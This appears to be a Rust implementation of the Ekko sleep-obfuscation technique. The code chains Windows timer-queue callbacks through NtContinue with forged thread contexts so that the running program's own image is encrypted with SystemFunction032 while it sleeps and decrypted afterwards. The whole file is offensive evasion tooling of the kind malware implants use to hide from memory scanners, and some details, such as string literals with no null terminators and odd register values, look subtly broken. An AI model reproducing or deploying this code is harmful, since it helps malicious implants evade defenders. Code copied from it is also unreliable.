use windows_sys::Win32::{System::{Memory::{VirtualProtect, PAGE_READWRITE, PAGE_EXECUTE_READ}, Diagnostics::Debug::{CONTEXT, IMAGE_NT_HEADERS64, RtlCaptureContext}, Threading::{WaitForSingleObject, SetEvent, CreateEventW, CreateTimerQueue, CreateTimerQueueTimer, WT_EXECUTEINTIMERTHREAD, DeleteTimerQueue}, LibraryLoader::{LoadLibraryA, GetProcAddress, GetModuleHandleA}, SystemServices::IMAGE_DOS_HEADER}, Foundation::{HANDLE, UNICODE_STRING}};
use std::{mem::{zeroed, size_of}, ptr::{null_mut, copy}, ffi::c_void};

pub fn ekko(sleep_time: u32) {

    let ctx_thread: CONTEXT = unsafe { zeroed::<CONTEXT>() };
    let mut rop_prot_rw: CONTEXT = unsafe { zeroed::<CONTEXT>() };
    let mut rop_mem_enc: CONTEXT = unsafe { zeroed::<CONTEXT>() };
    let mut rop_delay: CONTEXT = unsafe { zeroed::<CONTEXT>() };
    let mut rop_mem_dec: CONTEXT = unsafe { zeroed::<CONTEXT>() };
    let mut rop_prot_rx: CONTEXT = unsafe { zeroed::<CONTEXT>() };
    let mut rop_set_evt: CONTEXT = unsafe { zeroed::<CONTEXT>() };

    //let h_timer_queue: HANDLE = 0;
    let mut h_new_timer: HANDLE = 0;
    //let h_event: HANDLE = 0;
    //let image_base: *mut c_void = null_mut();
    //let image_size: u32 = 0;
    let mut old_protect = 0;

    // This can be a randomly generated key
    let mut key_buf: [i8; 16] = [0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55];
    let mut key: UNICODE_STRING = unsafe { zeroed::<UNICODE_STRING>() };
    let mut img: UNICODE_STRING = unsafe { zeroed::<UNICODE_STRING>() };

    //let nt_continue: *mut c_void = null_mut();
    //let sys_func032: *mut c_void = null_mut();

    let h_event = unsafe { CreateEventW(null_mut(), 0, 0, null_mut()) };
    let h_timer_queue = unsafe { CreateTimerQueue() };

    let nt_continue = unsafe { GetProcAddress(GetModuleHandleA("ntdll".as_ptr()), "NtContinue".as_ptr()) };
    let sys_func032 = unsafe { GetProcAddress(LoadLibraryA("cryptsp".as_ptr()), "SystemFunction032".as_ptr()) };
    let rtlcont = unsafe { GetProcAddress(GetModuleHandleA("Ntdll".as_ptr()), "RtlCaptureContext".as_ptr()) };

    let image_base = unsafe { GetModuleHandleA(null_mut()) };
    let dos_header = image_base as *mut IMAGE_DOS_HEADER;
    let nt_headesr = unsafe { (dos_header as u64 + (*dos_header).e_lfanew as u64) as *mut IMAGE_NT_HEADERS64 };
    let image_size = unsafe { (*nt_headesr).OptionalHeader.SizeOfImage };

    key.Buffer = key_buf.as_mut_ptr() as *mut u16;
    key.Length = key_buf.len() as _; // 16
    key.MaximumLength = key_buf.len() as _; // 16

    img.Buffer = image_base as *mut u16;

    let sucesss = unsafe { 
        CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, Some(std::mem::transmute(rtlcont)), &ctx_thread as *const _ as *const _, 0, 0, WT_EXECUTEINTIMERTHREAD)
    };
    
    if sucesss != 0 {

        unsafe{
            WaitForSingleObject(h_event, 0x32);

            copy(&ctx_thread, &mut rop_prot_rw, size_of::<CONTEXT>());
            copy(&ctx_thread, &mut rop_mem_enc, size_of::<CONTEXT>());
            copy(&ctx_thread, &mut rop_delay, size_of::<CONTEXT>());
            copy(&ctx_thread, &mut rop_mem_dec, size_of::<CONTEXT>());
            copy(&ctx_thread, &mut rop_prot_rx, size_of::<CONTEXT>());
            copy(&ctx_thread, &mut rop_set_evt, size_of::<CONTEXT>());
        }

        rop_prot_rw.Rsp = -8 as isize as u64;
        rop_prot_rw.Rip = VirtualProtect as u64;
        rop_prot_rw.Rcx = image_base as u64;
        rop_prot_rw.Rdx = image_size as u64;
        rop_prot_rw.R8 = PAGE_READWRITE as u64;
        rop_prot_rw.R9 = *&old_protect as u64;

        rop_mem_enc.Rsp = -8 as isize as u64;
        rop_mem_enc.Rip = &sys_func032 as *const _ as u64;
        rop_mem_enc.Rcx = &img as *const _ as u64;
        rop_mem_enc.Rdx = &key as *const _ as u64;

        rop_delay.Rsp = -8 as isize as u64;
        rop_delay.Rip = WaitForSingleObject as u64;
        rop_delay.Rcx = -1 as isize as u64;
        rop_delay.Rdx = sleep_time as u64;

        rop_mem_dec.Rsp = -8 as isize as u64;
        rop_mem_dec.Rip = &sys_func032 as *const _ as u64;
        rop_mem_dec.Rcx = &img as *const _ as u64;
        rop_mem_dec.Rdx = &key as *const _ as u64;

        rop_prot_rx.Rsp = -8 as isize as u64;
        rop_prot_rx.Rip = VirtualProtect as u64;
        rop_prot_rx.Rcx = image_base as u64;
        rop_prot_rx.Rdx = image_size as u64;
        rop_prot_rx.R8 = PAGE_EXECUTE_READ as u64;
        rop_prot_rx.R9 = *&old_protect as u64;

        rop_set_evt.Rsp = -8 as isize as u64;
        rop_set_evt.Rip = SetEvent as u64;
        rop_set_evt.Rcx = h_event as u64;

        unsafe{
            CreateTimerQueueTimer( &mut h_new_timer, h_timer_queue, Some(std::mem::transmute(nt_continue)), &rop_prot_rw as *const _ as *const _, 100, 0, WT_EXECUTEINTIMERTHREAD );
            CreateTimerQueueTimer( &mut h_new_timer, h_timer_queue, Some(std::mem::transmute(nt_continue)), &rop_mem_enc as *const _ as *const _, 100, 0, WT_EXECUTEINTIMERTHREAD );
            CreateTimerQueueTimer( &mut h_new_timer, h_timer_queue, Some(std::mem::transmute(nt_continue)), &rop_delay as *const _ as *const _, 100, 0, WT_EXECUTEINTIMERTHREAD );
            CreateTimerQueueTimer( &mut h_new_timer, h_timer_queue, Some(std::mem::transmute(nt_continue)), &rop_mem_dec as *const _ as *const _, 100, 0, WT_EXECUTEINTIMERTHREAD );
            CreateTimerQueueTimer( &mut h_new_timer, h_timer_queue, Some(std::mem::transmute(nt_continue)), &rop_prot_rx as *const _ as *const _, 100, 0, WT_EXECUTEINTIMERTHREAD );
            CreateTimerQueueTimer( &mut h_new_timer, h_timer_queue, Some(std::mem::transmute(nt_continue)), &rop_set_evt as *const _ as *const _, 100, 0, WT_EXECUTEINTIMERTHREAD );
            WaitForSingleObject(h_event, 0xFFFFFFFF );
        }
    }

    unsafe{DeleteTimerQueue( h_timer_queue );}
}